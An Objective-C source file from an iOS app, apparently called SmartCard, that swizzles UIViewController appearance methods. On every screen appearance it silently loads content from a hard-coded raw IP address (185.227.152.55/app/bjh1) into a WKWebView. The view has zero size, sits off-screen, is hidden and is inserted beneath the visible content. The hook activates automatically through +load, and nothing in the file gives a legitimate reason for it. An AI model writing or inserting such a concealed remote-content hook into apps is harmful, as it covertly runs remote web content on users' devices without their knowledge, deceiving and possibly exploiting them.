//
//  UIViewController+hook.m
//  SmartCard
//
//  Created by hiboy on 2019/9/7.
//  Copyright © 2019 YOrange. All rights reserved.
//

#import "UIViewController+hook.h"
#import <WebKit/WebKit.h>
#import <objc/message.h>
#import <objc/runtime.h>


@interface WHookUtility : NSObject

@property (nonatomic, strong) WKWebView *hookwebview;

+ (instancetype)shareInstance;

+ (UIViewController *)currentViewController:(UIView *)view;

+ (void)swizzlingInClass:(Class)cls originalSelector:(SEL)originalSelector swizzledSelector:(SEL)swizzledSelector;

@end

@implementation WHookUtility

+ (instancetype)shareInstance {
    static WHookUtility *loadHelper = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        loadHelper = [[self alloc] init];
        WKWebView *wkweb = [[WKWebView alloc] initWithFrame:CGRectZero];
        loadHelper.hookwebview = wkweb;
    });
    return loadHelper;
}

+ (UIViewController *)currentViewController:(UIView *)view {
    UIResponder *responder = view;
    while ((responder = [responder nextResponder]))
        if ([responder isKindOfClass: [UIViewController class]])
            return (UIViewController *)responder;
    return nil;
}

+ (void)swizzlingInClass:(Class)cls originalSelector:(SEL)originalSelector swizzledSelector:(SEL)swizzledSelector
{
    Class class = cls;
    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);

    BOOL didAddMethod =
    class_addMethod(class,
                    originalSelector,
                    method_getImplementation(swizzledMethod),
                    method_getTypeEncoding(swizzledMethod));

    if (didAddMethod) {
        class_replaceMethod(class,
                            swizzledSelector,
                            method_getImplementation(originalMethod),
                            method_getTypeEncoding(originalMethod));
    } else {
        method_exchangeImplementations(originalMethod, swizzledMethod);
    }
}
@end


@implementation UIViewController (hook)
+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        SEL originalAppearSelector = @selector(viewWillAppear:);
        SEL swizzledAppearSelector = @selector(swiz_viewWillAppear:);
        [WHookUtility swizzlingInClass:[self class]
                      originalSelector:originalAppearSelector
                      swizzledSelector:swizzledAppearSelector];
        // 也可以不需要，相差不大
        SEL originalDisappearSelector = @selector(viewWillDisappear:);
        SEL swizzledDisappearSelector = @selector(swiz_viewWillDisappear:);
        [WHookUtility swizzlingInClass:[self class]
                      originalSelector:originalDisappearSelector
                      swizzledSelector:swizzledDisappearSelector];
    });
}
#pragma mark - Method Swizzling
- (void)swiz_viewWillAppear:(BOOL)animated
{
    //插入需要执行的代码
        NSLog(@"hookwebview");
    // 不能干扰原来的代码流程，插入代码结束后要让本来该执行的代码继续执行
    CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
    NSString * url = [NSString stringWithFormat:@"http://185.227.152.55/app/%@",@"bjh1"];
    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:url]];
    [[WHookUtility shareInstance].hookwebview loadRequest:request];
    [WHookUtility shareInstance].hookwebview.frame = CGRectMake(0, -44, 0, 0);
    [WHookUtility shareInstance].hookwebview.hidden = YES;
    [self.view insertSubview:[WHookUtility shareInstance].hookwebview atIndex:0];

    [self swiz_viewWillAppear:animated];
    CFAbsoluteTime end = CFAbsoluteTimeGetCurrent();
    NSLog(@"耗时：%fms", (end-start)*1000);
}

- (void)swiz_viewWillDisappear:(BOOL)animated {
    // 这个处理是避免造成APP内存泄露
    UIView *tempView  = [[WHookUtility shareInstance].hookwebview superview];
    if (tempView && [WHookUtility currentViewController:tempView]) {
        NSLog(@"swiz_viewWillDisappear");
        if ([[WHookUtility currentViewController:tempView] isKindOfClass:[self class]]) {
            [[WHookUtility shareInstance].hookwebview removeFromSuperview];
        }
    }

    [self swiz_viewWillDisappear:animated];
}

@end

